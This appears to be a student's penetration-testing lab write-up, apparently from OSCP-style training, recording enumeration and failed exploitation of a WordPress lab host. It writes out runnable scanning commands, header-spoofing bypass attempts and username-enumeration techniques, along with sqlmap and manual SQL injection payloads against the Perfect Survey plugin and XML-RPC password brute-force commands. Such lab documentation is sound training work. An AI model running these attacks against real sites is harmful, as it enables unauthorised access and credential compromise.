# Chapter 10 Capstone 1 - Enumeration Documentation

**Target:** 192.168.229.47
**Date:** 2025-09-29
**Status:** Enumeration Phase Complete

---

## ENUMERATION SUMMARY

### SUCCESSFUL DISCOVERIES

**Initial Port Scan:**
- **Port 22**: OpenSSH 8.9p1 Ubuntu 3
- **Port 80**: Apache 2.4.52 (Ubuntu)
- **OS**: Ubuntu Linux

**Web Enumeration (192.168.229.47):**
- Static "Alvida Coffee" template site
- Email discovered: `info@alvida-eatery.org`
- Domain reference: `alvida-eatery.org` (KEY FINDING)
- `/readme.txt`: Template info only
- `/server-status`: Exists (403 Forbidden)

**Virtual Host Discovery (BREAKTHROUGH):**
- `alvida-eatery.org` → WordPress 6.0 site
- Different application on same IP

**WordPress Enumeration (alvida-eatery.org):**
- **Version**: WordPress 6.0 (insecure/outdated)
- **Username**: `admin` (confirmed)
- **XML-RPC**: Enabled (password attack vector)
- **Upload Directory**: Listing enabled (`/wp-content/uploads/`)
- **Theme**: OceanWP 3.3.2 (outdated)
- **Plugins**: perfect-survey, wpforms-lite, elementor, ocean-extra
- **REST API**: Enabled

---

## FAILED ATTEMPTS

**Apache Exploitation:**
- CVE-2021-41773 path traversal: Version 2.4.52 patched (vuln = 2.4.49-50)

**Server-Status Bypass (All Failed):**
- POST/OPTIONS methods → 403
- Header manipulation (X-Forwarded-For, X-Original-URL) → 403
- Path variations (trailing slash, double slash, dot-slash) → 403
- Case manipulation → 404
- URL encoding → 403
- `/server-info` endpoint → 404

**Web Application:**
- Parameter fuzzing (6453 params tested) → No hidden parameters
- robots.txt → 404 (doesn't exist)
- HTML comments → No sensitive data

**SSH:**
- OpenSSH 8.9p1 → Up-to-date, no known exploits
- No usernames identified for brute force

---

## DETAILED DISCOVERY METHODOLOGY

### 1. INITIAL PORT DISCOVERY

**Command:**
```bash
nmap -p- --min-rate 1000 -T4 192.168.229.47 -oN quick_scan.txt
```

**Flags Explained:**
- `-p-`: Scan all 65535 ports (complete coverage)
- `--min-rate 1000`: Send minimum 1000 packets/sec (speed boost)
- `-T4`: Aggressive timing template (faster scan)
- `-oN`: Normal output format for documentation

**Output:**
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

**Why it worked:** Fast full port scan completed in ~60 seconds vs 20+ minutes default

---

### 2. SERVICE VERSION DETECTION

**Command:**
```bash
nmap -p 22,80 -sV -sC -A 192.168.229.47 -oA detailed_229_47
```

**Flags Explained:**
- `-p 22,80`: Scan only discovered ports (much faster)
- `-sV`: Service version detection
- `-sC`: Default NSE scripts
- `-A`: OS detection + traceroute
- `-oA`: Output in all formats (XML, grep, normal)

**Output Revealed:**
- `22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3`
- `80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))`
- `|_http-title: Alvida Coffee`

**Why it worked:** `-sV` probes services for version banners, `-sC` runs default NSE scripts for additional enumeration

---

### 3. WEB TECHNOLOGY FINGERPRINTING

**Command:**
```bash
whatweb http://192.168.229.47 -v
```

**Flags Explained:**
- `-v`: Verbose output showing all detected technologies

**Output Revealed:**
- Apache/2.4.52 (Ubuntu)
- HTML5
- Email: `info@alvida-eatery.org`
- Static HTML site

**Why it worked:** WhatWeb detects CMS, frameworks, JavaScript libraries, server details from HTTP responses

---

### 4. DIRECTORY ENUMERATION

**Command:**
```bash
gobuster dir -u http://192.168.229.47 -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,txt,html -o gobuster.txt --no-error -b 404,403
```

**Flags Explained:**
- `dir`: Directory/file brute-forcing mode
- `-u`: Target URL
- `-w`: Wordlist path
- `-t 50`: 50 threads (aggressive)
- `-x`: File extensions to append
- `-o`: Output file for documentation
- `--no-error`: Suppress error messages
- `-b`: Exclude status codes

**Output Revealed:**
```
/index.html           (Status: 200)
/images               (Status: 301)
/css                  (Status: 301)
/js                   (Status: 301)
/readme.txt           (Status: 200)
/server-status        (Status: 403)
```

**Why it worked:** Brute-forces common directory/file names with specified extensions

---

### 5. README.TXT ANALYSIS

**Command:**
```bash
curl http://192.168.229.47/readme.txt
```

**Output Revealed:**
- "KNOX" template from styleshout.com
- Template documentation only (no credentials/vulns)

**Why it worked:** Direct file fetch - `readme.txt` often contains version info

---

### 6. SOURCE CODE ANALYSIS

**Command:**
```bash
curl -s http://192.168.229.47 | grep -E 'href=|src=' | sed 's/.*\(href\|src\)="\([^"]*\)".*/\2/' | sort -u
```

**Output Revealed:**
- `#hidden` anchor tag (scroll target - not interesting)
- Link to `http://alvida-eatery.org` **(CRITICAL FINDING)**
- Standard CSS/JS files

**Why it worked:** Extracts all links and sources from HTML for manual review

---

### 7. SERVER-STATUS DISCOVERY

**Discovery Method:**
- Gobuster found it: `/server-status (Status: 403)`

**What it is:** Apache module showing real-time server stats, often reveals internal paths/vhosts

**Why 403 matters:** Resource EXISTS but access denied (vs 404 = doesn't exist)

---

### 8. SERVER-STATUS BYPASS ATTEMPTS (ALL FAILED)

**A. HTTP Method Manipulation:**
```bash
curl -X POST http://192.168.229.47/server-status
curl -X OPTIONS http://192.168.229.47/server-status
```
**Result:** 403 (server doesn't accept alternate methods)

**B. Header Spoofing (Localhost Bypass):**
```bash
curl -H "X-Forwarded-For: 127.0.0.1" http://192.168.229.47/server-status
curl -H "X-Original-URL: /server-status" http://192.168.229.47/
curl -H "X-Rewrite-URL: /server-status" http://192.168.229.47/
```
**Result:** 403 (Apache doesn't honor these headers for access control)

**C. Path Manipulation:**
```bash
curl http://192.168.229.47/server-status/
curl http://192.168.229.47//server-status
curl http://192.168.229.47/./server-status
```
**Result:** All 403 (Apache normalizes paths)

**D. Case Variation:**
```bash
curl http://192.168.229.47/Server-Status
```
**Result:** 404 (Linux filesystem is case-sensitive)

**E. URL Encoding:**
```bash
curl http://192.168.229.47/%73erver-status
```
**Result:** 403 (Apache decodes before access check)

**Why ALL failed:** Apache properly configured with `<Location>` directive restricting to localhost only

---

### 9. PARAMETER FUZZING

**Command:**
```bash
ffuf -u "http://192.168.229.47/index.html?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 15405
```

**Flags Explained:**
- `-u`: Target URL with FUZZ placeholder
- `-w`: Wordlist for parameter names
- `-fs 15405`: Filter out default page size

**Output:** No results (all responses = 15405 bytes)

**Why it failed:** Static site doesn't process parameters

---

### 10. VIRTUAL HOST DISCOVERY (BREAKTHROUGH)

**Command:**
```bash
curl -H "Host: alvida-eatery.org" http://192.168.229.47
```

**Output:** Returned DIFFERENT website (WordPress)

**Why it worked:** Apache virtual hosts route requests based on `Host` header:
- `Host: 192.168.229.47` → Static site
- `Host: alvida-eatery.org` → WordPress site

**Critical Lesson:** Always test domain names found in content as virtual hosts

---

### 11. WORDPRESS IDENTIFICATION

**Command:**
```bash
curl -s -H "Host: alvida-eatery.org" http://192.168.229.47 | head -100
```

**Output Revealed:**
```html
<meta name="generator" content="WordPress 6.0" />
<link rel='stylesheet' href='http://alvida-eatery.org/wp-includes/css/...' />
<link rel="https://api.w.org/" href="http://alvida-eatery.org/index.php?rest_route=/" />
```

**Why it worked:** WordPress leaves fingerprints in HTML:
- Generator meta tag
- `/wp-includes/`, `/wp-content/` paths
- REST API link

---

### 12. WORDPRESS TECHNOLOGY STACK

**Command:**
```bash
whatweb http://192.168.229.47 -H "Host: alvida-eatery.org"
```

**Output Revealed:**
- WordPress 6.0
- jQuery 3.6.0
- Theme: OceanWP
- Plugins detected in HTML

**Why it worked:** WhatWeb analyzes headers + HTML patterns for CMS fingerprinting

---

### 13. REST API CONFIRMATION

**Command:**
```bash
curl -I -H "Host: alvida-eatery.org" http://192.168.229.47
```

**Header Found:**
```
Link: <http://alvida-eatery.org/index.php?rest_route=/>; rel="https://api.w.org/"
```

**What it means:** WordPress REST API enabled (default in WP 4.7+)

**Why it matters:** Allows unauthenticated user enumeration

---

### 14. /ETC/HOSTS CONFIGURATION

**Command:**
```bash
echo "192.168.229.47 alvida-eatery.org" | sudo tee -a /etc/hosts
```

**Why needed:** Makes domain resolve to IP locally, allowing tools to work normally

---

### 15. WPSCAN FULL ENUMERATION

**Command:**
```bash
wpscan --url http://alvida-eatery.org --enumerate u,vp,vt --plugins-detection aggressive
```

**Flags Explained:**
- `--enumerate u`: User enumeration
- `--enumerate vp`: Vulnerable plugins
- `--enumerate vt`: Vulnerable themes
- `--plugins-detection aggressive`: Deep scan (checks 7343+ plugin locations)

**Key Findings:**

**A. XML-RPC Discovery:**
```
[+] XML-RPC seems to be enabled: http://alvida-eatery.org/xmlrpc.php
```
**How found:** WPScan directly requests `/xmlrpc.php` and checks response

**B. Upload Directory Listing:**
```
[+] Upload directory has listing enabled: http://alvida-eatery.org/wp-content/uploads/
```
**How found:** WPScan requests directory and checks if Apache returns directory index

**C. WordPress Version:**
```
[+] WordPress version 6.0 identified (Insecure, released on 2022-05-24).
```
**How found:** Checks RSS feeds which include WordPress version in `<generator>` tag

**D. Theme Detection:**
```
[+] WordPress theme in use: oceanwp
 | Version: 3.3.2 (80% confidence)
```
**How found:**
1. HTML contains: `<link href='/wp-content/themes/oceanwp/style.css'>`
2. WPScan fetches `style.css` and parses version header

**E. Username Discovery:**
```
[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

**Three Discovery Methods:**

**Method 1 - RSS Feed:**
```bash
curl -s http://alvida-eatery.org/?feed=rss2 | grep "<dc:creator>"
```
Output: `<dc:creator><![CDATA[admin]]></dc:creator>`

**Method 2 - Author ID Enumeration:**
```bash
curl -s http://alvida-eatery.org/?author=1
```
- If user exists: Redirects to `/author/admin/`
- If not: 404 error

**Method 3 - Login Error Messages:**
```bash
curl -s http://alvida-eatery.org/wp-login.php -d "log=admin&pwd=wrong"
```
Output difference:
- Valid user: "ERROR: The password you entered for the username **admin** is incorrect"
- Invalid user: "ERROR: Invalid username"

---

## CURRENT ATTACK SURFACE

### HIGH PRIORITY

1. **Password attack on `admin`** via XML-RPC
   - XML-RPC allows brute-force without rate limiting
   - Username confirmed: `admin`

2. **Check `/wp-content/uploads/`** for sensitive files
   - Directory listing enabled
   - May contain backups, configs, credentials

3. **Search for WordPress 6.0 exploits**
   - Version identified as insecure
   - Released 2022-05-24 (outdated)

### MEDIUM PRIORITY

4. Check for plugin-specific vulnerabilities
5. Enumerate more WordPress endpoints
6. Test XML-RPC methods for additional vectors

---

## ENUMERATION TECHNIQUE SUMMARY

| **Discovery** | **Primary Tool** | **Why It Worked** |
|--------------|------------------|-------------------|
| Open ports | nmap -p- | Full range scan with speed optimization |
| Service versions | nmap -sV -sC | Banner grabbing + NSE scripts |
| Web tech | whatweb | Fingerprints frameworks/CMS/libraries |
| Directories | gobuster | Brute-forces common paths |
| Hidden params | ffuf | Tests thousands of parameter names |
| Source analysis | curl + grep | Extracts all links/references |
| Virtual host | curl -H "Host:" | Tests domain found in HTML |
| WordPress details | wpscan | Specialized WP scanner with 7000+ checks |
| Username | RSS feed + author enum + login errors | Multiple passive/active methods |
| XML-RPC | Direct access | Standard WP endpoint check |

---

## KEY LESSONS LEARNED

1. **Always test domain names found in content** as virtual hosts
   - Direct IP showed static site, but domain revealed WordPress

2. **403 ≠ dead end** - it confirms resource exists
   - Attempted multiple bypass techniques on `/server-status`

3. **Multiple enumeration methods** increase success
   - nmap → whatweb → gobuster → wpscan layered approach

4. **WordPress leaves many fingerprints**
   - Generator tags, standard paths, RSS feeds all leak info

5. **Username enumeration has multiple vectors**
   - Try all methods: RSS, author IDs, login errors

6. **Static sites can hide dynamic apps** on same server via vhosts
   - Don't stop at first web app discovered

---

## NEXT STEPS

### Immediate Actions

```bash
# 1. Targeted password attack (fast)
wpscan --url http://alvida-eatery.org -U admin -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt --password-attack xmlrpc

# 2. Check uploads directory for sensitive files
curl -s http://alvida-eatery.org/wp-content/uploads/ | grep -E "href.*\.(txt|sql|zip|bak|log|conf)"

# 3. Search for WordPress 6.0 exploits
searchsploit wordpress 6.0
searchsploit oceanwp
```

### If Password Attack Fails

- Escalate to rockyou.txt (larger wordlist)
- Check for plugin-specific vulnerabilities
- Test XML-RPC for additional attack vectors
- Look for file upload vulnerabilities in plugins

---

**Enumeration Phase: COMPLETE**
**Attack Phase: IN PROGRESS**

---

# EXPLOITATION ATTEMPTS

## WORDPRESS PLUGIN VULNERABILITIES

### 1. PERFECT SURVEY - UNAUTHENTICATED SQL INJECTION (CVE-2021-24762)

**Vulnerability Details:**
- **Plugin**: Perfect Survey 1.5.1
- **CVE**: CVE-2021-24762
- **Type**: Unauthenticated SQL Injection
- **CVSS**: 9.8 (Critical)
- **Endpoint**: `/wp-admin/admin-ajax.php?action=get_question&question_id=*`
- **Parameter**: `question_id` (vulnerable)
- **Exploit**: ExploitDB #50766

**Exploitation Attempt:**

**Step 1 - Verification:**
```bash
curl "http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1"
```

**Response:**
```json
{"question_id":"1","html":""}
```

**HTTP Status:** 404 Not Found

**Critical Issue:** Endpoint returns valid JSON but with 404 status code

---

**Step 2 - SQLMap Automated Testing:**

**Exploit Script Retrieved:**
```bash
searchsploit -m 50766
mv 50766.py exploits/wordpress/wp-perfect-survey.py
```

**Generated SQLMap Command:**
```bash
sqlmap -u "http://alvida-eatery.org/wp-admin/admin-ajax.php" \
  --data "action=get_question&question_id=1*" \
  --dbs --batch
```

**Result:**
```
[CRITICAL] page not found (404)
[WARNING] HTTP error codes detected during run:
404 (Not Found) - 1 times
```

**Issue:** SQLMap automatically aborts on 404 responses

---

**Step 3 - Force Ignore 404:**

**Command:**
```bash
sqlmap -u "http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1*" \
  --batch --skip-heuristics --skip-waf --ignore-code=404
```

**Result:** Still rejected - SQLMap treats 404 as fatal regardless of flags

---

**Step 4 - Maximum Aggressiveness:**

**Command:**
```bash
sqlmap -u "http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1*" \
  --batch --level=5 --risk=3 --ignore-code=404
```

**Result:** Failed - same 404 rejection

---

**Step 5 - Manual SQL Injection Testing:**

**Test Payload:**
```bash
curl "http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1' OR '1'='1"
```

**Result:** Request timed out (no response)

---

**Analysis:**

**Why Exploitation Failed:**

1. **Unusual Behavior:** Endpoint returns valid JSON structure (`{"question_id":"1","html":""}`) but with HTTP 404 status
2. **SQLMap Limitation:** Tool treats 404 as "page doesn't exist" and aborts, even with `--ignore-code=404`
3. **Possible Causes:**
   - Perfect Survey plugin may not be fully activated
   - AJAX handler registered but returns 404 by design
   - `.htaccess` rules interfering with `/wp-admin/` access
   - Plugin code returns 404 for empty survey results

4. **Evidence Plugin Is Active:**
   - Plugin files exist at `/wp-content/plugins/perfect-survey/`
   - JavaScript/CSS loaded on homepage
   - AJAX endpoint responds (doesn't timeout)
   - Returns structured JSON (not generic 404 page)

5. **The 404 Paradox:**
   - **Typical 404**: No response or generic error page
   - **This case**: Structured JSON response with survey data structure
   - **Conclusion**: Application-level 404, not server-level

**Lessons Learned:**
- HTTP status codes don't always reflect application state
- Tool limitations: SQLMap can't bypass 404 rejection logic
- Manual exploitation would require intercepting/modifying status codes
- Valid JSON response indicates endpoint IS processing requests

**Recommended Next Steps:**
- Test with Burp Suite to modify status codes in transit
- Check for survey creation functionality (create test survey)
- Examine plugin source code for 404 logic
- Test other AJAX endpoints in the plugin

---

### 2. ELEMENTOR - AUTHENTICATED VULNERABILITIES (CVE-2022-1329)

**Vulnerability Details:**
- **Plugin**: Elementor 3.6.5
- **CVE**: CVE-2022-1329 (Multiple)
- **Type**: Authenticated vulnerabilities (Contributor+ required)
- **Status**: ❌ **Not exploitable** (requires authentication)

**Why Skipped:**
- All Elementor 3.6.5 exploits require Contributor-level access minimum
- No unauthenticated attack vectors identified
- Focus on unauthenticated exploitation first

---

### 3. OCEAN-EXTRA - UNAUTHENTICATED SHORTCODE EXECUTION (CVE-2025-3472)

**Vulnerability Details:**
- **Plugin**: Ocean Extra 2.0.1
- **CVE**: CVE-2025-3472
- **Type**: Unauthenticated shortcode to RCE
- **Status**: ❌ **No public PoC available**

**Research Findings:**
- WPScan database confirms vulnerability exists
- No ExploitDB entry
- No Metasploit module
- No public proof-of-concept code available
- Requires deep plugin source code analysis

**Recommended Action:**
- Manual source code review required
- Out of scope for time-constrained assessment

---

### 4. WORDPRESS 6.0 CORE VULNERABILITIES

**Research Target:** Unauthenticated RCE exploits for WordPress 6.0

**Vulnerability Research:**

**CVE-2022-21661: SQL Injection via WP_Query**
- **Type**: SQL Injection in core WP_Query class
- **Affected**: WordPress < 5.8.3
- **Status**: ❌ **Patched in WP 6.0** (released May 2022)
- **Reason**: WP 6.0 includes all security patches from 5.8.x branch

**Additional Research:**
```bash
searchsploit wordpress 6.0
```
**Results:**
- No unauthenticated RCE exploits found
- Authenticated exploits require valid credentials
- Most WP 6.0 vulnerabilities are XSS/CSRF (low impact)

**Conclusion:**
- WordPress 6.0 core is relatively secure for unauthenticated attacks
- Known vulnerabilities are low-severity or patched

---

## PASSWORD ATTACKS

### 1. TARGETED PASSWORD LIST (CONTEXT-BASED)

**Strategy:** Create custom wordlist based on target context

**Wordlist Creation:**
```bash
cat > /home/kali/OSCP/wordpress_passwords.txt << 'EOF'
admin
password
admin123
wordpress
123456
password123
admin@123
Welcome1
P@ssw0rd
Admin123
alvida
eatery
coffee
survey
EOF
```

**Reasoning:**
- Common WordPress defaults (admin, password, wordpress)
- Common patterns (admin123, password123)
- Target-specific terms (alvida, eatery, coffee, survey)

**Attack Command:**
```bash
wpscan --url http://alvida-eatery.org \
  -U admin \
  -P /home/kali/OSCP/wordpress_passwords.txt \
  --password-attack xmlrpc
```

**Flags Explained:**
- `-U admin`: Username to attack
- `-P`: Password wordlist path
- `--password-attack xmlrpc`: Use XML-RPC method (faster, no lockout)

**Result:**
```
[i] No Valid Passwords Found.

Finished: Mon Sep 29 20:52:04 2025
Requests Done: 195
Elapsed time: 00:00:11
```

**Conclusion:** All targeted passwords failed

---

### 2. ROCKYOU.TXT PASSWORD ATTACK (ATTEMPTED)

**Strategy:** Comprehensive brute-force with 14M+ passwords

**Attack Command:**
```bash
wpscan --url http://alvida-eatery.org \
  -U admin \
  -P /usr/share/wordlists/rockyou.txt \
  --password-attack xmlrpc \
  -t 50 --max-threads 50
```

**Error Encountered:**
```
Scan Aborted: --passwords The path '/usr/share/wordlists/rockyou.txt' does not exist or is not a file
```

**Root Cause:** File exists as `/usr/share/wordlists/rockyou.txt.gz` (compressed)

**Required Fix:**
```bash
# Extract rockyou.txt (creates uncompressed version)
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Verify extraction
ls -lh /usr/share/wordlists/rockyou.txt
# Expected: ~130MB file with 14,344,392 passwords
```

**Status:** ❌ **Not completed** (file extraction required)

**Time Estimate:**
- Extraction: ~30 seconds
- Full attack: 4-8 hours (depending on server response time)

**Decision:** Deferred due to time constraints

---

### 3. XML-RPC ATTACK CHARACTERISTICS

**Why XML-RPC for Password Attacks:**

1. **No rate limiting:** WordPress core doesn't throttle XML-RPC by default
2. **Batch requests:** Can test multiple passwords in single request
3. **No lockout:** Unlike wp-login.php which may trigger lockouts
4. **Faster:** Direct API calls vs HTML form submission

**Verification Test:**
```bash
curl -X POST http://alvida-eatery.org/xmlrpc.php \
  -d '<?xml version="1.0"?>
<methodCall>
<methodName>system.listMethods</methodName>
</methodCall>'
```

**Response Time:** 10+ seconds (very slow)

**Observation:** XML-RPC enabled but responds very slowly, indicating possible:
- Rate limiting at network level
- Server-side delays (mod_security, fail2ban)
- Resource constraints

**Impact on Attack:** Slower attacks = longer time required

---

## UPLOAD DIRECTORY ENUMERATION

**Finding:** Directory listing enabled on `/wp-content/uploads/`

**Command:**
```bash
curl -s http://alvida-eatery.org/wp-content/uploads/ | grep -E "href"
```

**Results:**
- Standard WordPress upload directory structure
- Subdirectories by year/month (e.g., `2022/05/`)
- No visible sensitive files (no .sql, .zip, .bak, .txt, .log files)

**Deeper Enumeration:**
```bash
# Check common backup locations
curl -I http://alvida-eatery.org/wp-content/uploads/backup.sql
curl -I http://alvida-eatery.org/wp-content/uploads/db.sql
curl -I http://alvida-eatery.org/wp-content/uploads/wordpress.sql

# Result: All 404 (not found)
```

**Conclusion:** No sensitive files discovered in uploads directory

---

## EXPLOITATION STATUS SUMMARY

| **Attack Vector** | **Status** | **Result** | **Reason** |
|-------------------|------------|------------|------------|
| Perfect Survey SQLi | ❌ Failed | 404 response blocks exploitation | Endpoint returns 404 with valid JSON |
| Elementor vulns | ⏭️ Skipped | Requires authentication | Contributor+ access needed |
| Ocean-Extra RCE | ⏭️ Skipped | No public PoC | No exploit code available |
| WordPress 6.0 RCE | ❌ None found | Core is patched | No unauth exploits exist |
| Targeted passwords | ❌ Failed | No valid passwords | 14 passwords tested |
| Rockyou.txt attack | ⏸️ Deferred | File compressed | Requires extraction |
| Upload directory | ❌ Failed | No sensitive files | Directory listing enumerated |

---

## CURRENT SITUATION ANALYSIS

### What We Know:
✅ WordPress 6.0 with confirmed vulnerabilities in plugins
✅ Username: `admin` (confirmed)
✅ XML-RPC enabled (password attack vector)
✅ Perfect Survey plugin active with known SQLi vulnerability
✅ Directory listing enabled on uploads

### What's Blocking Progress:
❌ Perfect Survey exploitation blocked by 404 status code behavior
❌ Password attacks failed (weak passwords tested)
❌ No public exploits for Ocean-Extra unauthenticated RCE
❌ WordPress 6.0 core has no unauthenticated RCE

### Remaining Options:

**Option A: Extensive Password Attack**
```bash
# Extract rockyou.txt
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Launch comprehensive attack (4-8 hours)
wpscan --url http://alvida-eatery.org \
  -U admin \
  -P /usr/share/wordlists/rockyou.txt \
  --password-attack xmlrpc \
  -t 50 --max-threads 50
```
**Time:** 4-8 hours
**Success Rate:** Medium (depends on password complexity)

**Option B: Manual Perfect Survey Analysis**
- Download plugin source code
- Analyze why endpoint returns 404
- Attempt manual SQL injection with Burp Suite
- Modify HTTP status codes in transit
**Time:** 2-3 hours
**Success Rate:** Low-Medium (depends on root cause)

**Option C: Alternative Plugin Research**
- Deep dive into Ocean-Extra source code
- Search for other plugin vulnerabilities
- Check for theme-specific vulnerabilities
**Time:** 2-4 hours
**Success Rate:** Low (no guarantees)

**Option D: Pivot Attack Vector**
- Re-examine SSH (port 22)
- Check for other users besides "admin"
- Look for additional vhosts/subdomains
**Time:** 1-2 hours
**Success Rate:** Low

---

## LESSONS LEARNED - EXPLOITATION PHASE

1. **HTTP Status Codes Can Be Misleading**
   - Valid JSON response with 404 status is unusual
   - Tools like SQLMap have rigid logic around error codes
   - Manual testing may reveal what automated tools miss

2. **Public PoC ≠ Exploitability**
   - CVE exists but may not be exploitable in specific configurations
   - Plugin may be installed but not fully configured
   - Environment-specific factors matter

3. **Authentication is a Hard Barrier**
   - Many high-severity exploits require at least Contributor access
   - Without credentials, attack surface dramatically shrinks
   - Password attacks are time-intensive

4. **Enumeration Findings Don't Guarantee Exploitation**
   - Directory listing enabled but no sensitive files found
   - XML-RPC enabled but slow response times
   - Plugins installed but may not be configured

5. **Time Constraints Force Prioritization**
   - Comprehensive password attacks take hours
   - Manual code analysis is time-intensive
   - Must balance thoroughness vs. efficiency

---

**Exploitation Phase: IN PROGRESS**
**Recommended Next Action: Option A (Rockyou Password Attack)**